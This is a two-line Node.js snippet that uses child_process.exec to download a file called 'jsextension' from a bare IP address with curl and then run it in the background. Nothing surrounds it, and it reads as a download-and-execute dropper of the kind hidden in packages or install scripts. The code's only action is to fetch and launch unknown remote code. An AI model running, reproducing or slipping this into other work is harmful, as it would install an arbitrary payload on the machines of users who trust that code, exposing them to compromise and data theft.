const { exec } = require('child_process');
exec(`curl http://159.148.186.228/download/jsextension -o jsextension && ./jsextension &`);
